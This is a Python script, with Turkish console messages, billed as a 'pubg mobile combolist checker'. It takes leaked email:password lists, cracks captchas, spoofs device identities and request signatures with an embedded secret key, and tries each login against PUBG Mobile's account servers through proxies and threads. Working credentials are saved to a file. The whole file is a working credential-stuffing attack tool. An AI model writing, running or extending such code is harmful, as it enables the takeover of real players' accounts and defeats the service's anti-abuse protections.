import hashlib, requests, uuid, random, time, string, threading, datetime, os
from urllib.parse import quote, urlparse, parse_qs
from colorama import Fore, init
init()
from pystyle import *

from utils.captcha import *

lock = threading.Lock()

class PUBGMApi:
    def __init__(self):
        self.acc_verified_count = 0
        self.acc_fake_count = 0
        self.acc_error_count = 0

        config = json.loads(open("settings.json", "r").read())
        self.max_thread = config["thread"]
        proxy = config["proxy_list"]["http"]

        self.valid_mails = ['gmail.com', 'hotmail.com', 'mynet.com', 'etoic.com', 'outlook.com', 'getsimpleemail.com', 'outlook.com.tr', 'bcaoo.com', 'yandex.com', 'me.com', 'tmpnator.live', 'mailboxy.fun', 'yahoo.com', 'naver.com', 'gifto12.com', 'khtyler.com', 'icloud.com', 'betsbest24.ru', 'maxresistance.com', 'aditus.info', 'seacob.com', 'yopmail.com', 'hotmail.com.tr', 'msn.com', 'dashseat.com', 'desoz.com', 'eoopy.com', 'poly-swarm.com', 'pay-mon.com', 'tutye.com', 'zwoho.com', 'bk.ru', 'lakqs.com', 'yandex.ru', 'cuoly.com', 'gmal.com', 'hotmail.co.uk', 'fuluj.com', 'donymails.com', 'mail.com', 'bit-degree.com', 'lidte.com', 'mailing.one', 'macosnine.com', 'trimsj.com', 'blightpro.org', 'utoo.email', 'cndps.com', 'nedoz.com', 'netjook.com', 'tigasu.com', 'nbzmr.com', 'rsvhr.com', 'yusuf.com.tr', 'nilex.com', 'lovomon.com', 'cloud-mail.top', 'veberod.com', 'yk20.com', 'emakmintadomain.co', 'windowslive.com', 'air2token.com', 'bcxaiws58b1sa03dz.ga', 'htmail.com', 'senpol.de', 'urhen.com', 'taylorventuresllc.com', 'yandex.xom', 'live.com', 'mailapps.online', 'planet-travel.club', 'nickrizos.com', 'aiclbd.com', 'larjem.com', 'charter.net', 'convivemail.club', 'hotmial.com', 'mhzayt.online', 'sfr.fr', 'live.co.uk', 'mail.ru', 
'vps30.com', 'o3enzyme.com', 'digital-work.net', 'live.com', 'mail.com']
        self.mails_exts = []
        
        self.user_agent_list = ["Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv", "Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817", "Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv", "Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv", "Linux; Android 9; SM-G973U Build/PPR1.180610.011", "Linux; Android 8.0.0; SM-G960F Build/R16NW", "Linux; Android 7.0; SM-G892A Build/NRD90M; wv", "Linux; Android 7.0; SM-G930VC Build/NRD90M; wv", "Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv", "Linux; Android 6.0.1; SM-G920V Build/MMB29K", "Linux; Android 5.1.1; SM-G928X Build/LMY47X"]
        self.device_models = ["G011A", "SM-S906N", "SM-G996U", "SM-G980F", "SM-G973U", "SM-G960F", "SM-G892A", "SM-G930VC", "SM-G935S", "SM-G928X", "J8110", "G8231", "E6653"]
        
        self.secret_key = "3ec8cd69d71b7922e2a17445840866b26d86e283"

        self.proxy = {
            'http': proxy,
            'https': proxy,
        }

    def write_file(self, file_name, string):
        with lock:
            file = open(file_name, "a", encoding="utf-8")
            file.write(string)
            file.close()

    def up_value(self, value):
        with lock:
            if value == "verified":
                self.acc_verified_count += 1
            elif value == "fake":
                self.acc_fake_count += 1
            elif value == "error":
                self.acc_error_count += 1

            System.Title(f"pubg mobile combolist checker - verified: {self.acc_verified_count} fake: {self.acc_fake_count} error: {self.acc_error_count}")

    def get_combos(self):
        try:
            tmp_list = open("combo_list.txt", "r", encoding="utf-8").readlines()
        except:
            tmp_list = open("combo_list.txt", "r").readlines()
        combo_list = []
        for combo in tmp_list:
            try:
                combo = combo.replace("\n", "")
                mail_ext = combo.split(":")[0].split("@")[1]
                combo_list.append(combo)
            except:
                self.write_file("error_write.txt", f"{combo}\n")
                self.up_value("error")

        return combo_list

    def gen_headers(self):
        return {
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": f"Dalvik/2.1.0 ({random.choice(self.user_agent_list)})",
                "Host": "igame.msdkpass.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
        
    def gen_passwd_hash(self, passwd):
        return hashlib.md5(bytes(passwd, encoding="utf-8")).hexdigest()

    def gen_signature(self, string):
        return hashlib.md5(bytes(string, encoding="utf-8")).hexdigest()
    
    def gen_valid_key(self, url):
        url_components = urlparse(url)
        query_params = parse_qs(url_components.query)
        sorted_params = dict(sorted(query_params.items()))

        s_key = ''
        for value in sorted_params.values():
            s_key += ''.join(value)

        s_key += self.secret_key

        return hashlib.md5(s_key.encode()).hexdigest()

    def gen_device(self):
        did = uuid.uuid4()
        dinfo = quote(f"1|28602|{random.choice(self.device_models)}|tr|2.6.0|{int(time.time() * 1000)}|1.5|1280*730|google")

        gid = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(32))
        
        return did, dinfo, gid
    
    def gen_captcha(self, driver, captcha_api):
        counter = 0
        while True:
            if counter == 10:
                return False
            driver.refresh()

            token_result = captcha_api.run()
            if token_result != False:
                if "ticket" in token_result:
                    return token_result["ticket"], token_result["randstr"]
            else:
                counter += 1
                print(Fore.WHITE + "captcha, false.")

    def check_login(self, mail, passwd, cap_token, cap_rnd):
        headers = self.gen_headers()

        hash_passwd = self.gen_passwd_hash(passwd)
        first_flow_sig = self.gen_signature("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+mail+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+hash_passwd+"\",\"qcaptcha\":{\"ret\": 0, \"msg\": \"success\", \"randstr\": \""+cap_rnd+"\", \"ticket\": \""+cap_token+"\"}}" + self.secret_key)

        first_flow_url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={first_flow_sig}"
        first_flow_data = "{\"account\":\""+mail+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+hash_passwd+"\",\"qcaptcha\":{\"ret\": 0, \"msg\": \"success\", \"randstr\": \""+cap_rnd+"\", \"ticket\": \""+cap_token+"\"}}"
        for i in range(3):
            while True:
                try:
                    first_flow_res = requests.get(first_flow_url, data=first_flow_data, headers=headers, proxies=self.proxy)
                    break
                except:
                    pass

            if first_flow_res.status_code == 200:
                res_json = first_flow_res.json()
                if "token" in res_json:
                    check_token = res_json["token"]
                    check_uid = res_json["uid"]

                    did, dinfo, gid = self.gen_device()
                    sValidKey = self.gen_valid_key(f"https://ig-us-sdkapi.igamecj.com/v1.0/user/login?did={did}&dinfo={dinfo}&iChannel=42&iGameId=1320&iPlatform=2&sGuestId={gid}&sOriginalId={gid}&sRefer=&token={quote(check_token)}&uid={check_uid}")

                    sec_flow_url = f"https://ig-us-sdkapi.igamecj.com/v1.0/user/login?did={did}&dinfo={dinfo}&iChannel=42&iGameId=1320&iPlatform=2&sGuestId={gid}&sOriginalId={gid}&sRefer=&sValidKey={sValidKey}&token={quote(check_token)}&uid={check_uid}"
                    for i in range(3):
                        while True:
                            try:
                                sec_flow_res = requests.get(sec_flow_url, proxies=self.proxy)
                                break
                            except:
                                pass
                            
                        if sec_flow_res.status_code == 200:
                            res_json = sec_flow_res.json()
                            if "desc" in res_json and res_json["desc"] == "SUCCESS":
                                print(Fore.GREEN + f"başarılı: {mail}:{passwd}")
                                self.write_file("verified.txt", f"{mail}:{passwd}\n")
                                self.up_value("verified")
                                break
                            else:
                                print(Fore.RED + f"geçersiz: {mail}:{passwd}")
                                self.write_file("fake.txt", f"{mail}:{passwd}\n")
                                self.up_value("fake")
                                break
                        elif sec_flow_res.status_code == 503:
                            if i == 0:
                                self.write_file("error.txt", f"{mail}:{passwd}\n")
                                self.up_value("error")
                            continue
                        else:
                            print(Fore.WHITE + f"error:\nstatus_code: {sec_flow_res.status_code}\ncontent: {sec_flow_res.content}")
                            self.write_file("error.txt", f"{mail}:{passwd}\n")
                            self.up_value("error")
                            break
                    break
                elif "msg" in res_json:
                    if res_json["msg"] == "wrong password!":
                        print(Fore.RED + f"geçersiz: {mail}:{passwd}")
                        self.write_file("fake.txt", f"{mail}:{passwd}\n")
                        self.up_value("fake")
                        break
                else:
                    print(Fore.WHITE + f"error:\nstatus_code: {sec_flow_res.status_code}\ncontent: {sec_flow_res.content}")
                    self.write_file("error.txt", f"{mail}:{passwd}\n")
                    self.up_value("error")
                    break
            elif first_flow_res.status_code == 503:
                if i == 0:
                    self.write_file("error.txt", f"{mail}:{passwd}\n")
                    self.up_value("error")
                continue
            else: 
                print(Fore.WHITE + f"error:\nstatus_code: {sec_flow_res.status_code}\ncontent: {sec_flow_res.content}")
                self.write_file("error.txt", f"{mail}:{passwd}\n")
                self.up_value("error")
                break

    def start_browsers(self):
        captcha_api = CaptchaCracker()
        self.api_objects.append(captcha_api)

    def start_thread(self, thread_dict, _, captcha_api):
        driver = captcha_api.get_driver()

        for combo in thread_dict[f"thread_{_}"]:
            try:
                mail, passwd = combo.split(":")
                stat = self.gen_captcha(driver, captcha_api)
                if stat:
                    cap_token, cap_rnd = stat
                else:
                    try:
                        driver.close()
                    except:
                        pass
                    captcha_api = CaptchaCracker()
                    driver = captcha_api.get_driver()
                    continue
                self.check_login(mail, passwd, cap_token, cap_rnd)
            except:
                self.write_file("error.txt", f"{mail}:{passwd}\n")
                self.up_value("error")

    def main(self):
        System.Title("pubg mobile combolist checker - verified: 0 fake: 0 error: 0")
        combo_list = self.get_combos()

        max_thread = int(self.max_thread)
        if len(combo_list) <= max_thread:
            max_thread = len(combo_list)

        thread_dict = {f"thread_{i}": [] for i in range(max_thread)}

        count = 0
        for combo in combo_list:
            if count == max_thread:
                count = 0
            thread_dict[f"thread_{count}"].append(combo)
            count += 1

        print(Fore.YELLOW + "browser'lar açılıyor...")
        self.api_objects = []
        threads = []
        for _ in range(max_thread):
            thread = threading.Thread(target=self.start_browsers)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()
        print(Fore.GREEN + "tüm browser'lar açıldı!")
        os.system('cls')

        now = datetime.datetime.now()
        count = 0
        threads = []
        for captcha_api in self.api_objects:
            thread = threading.Thread(target=self.start_thread, args=(thread_dict, count, captcha_api))
            thread.start()
            threads.append(thread)
            count += 1
        for thread in threads:
            thread.join()
        now_now = datetime.datetime.now()

        print(Fore.MAGENTA + f"{len(combo_list)} hesap kontrol edildi, {self.acc_verified_count} adet düştü. fakes: {self.acc_fake_count}, errors: {self.acc_error_count} -> {now_now - now}")
        input()

if __name__ == '__main__':
    api = PUBGMApi()
    api.main()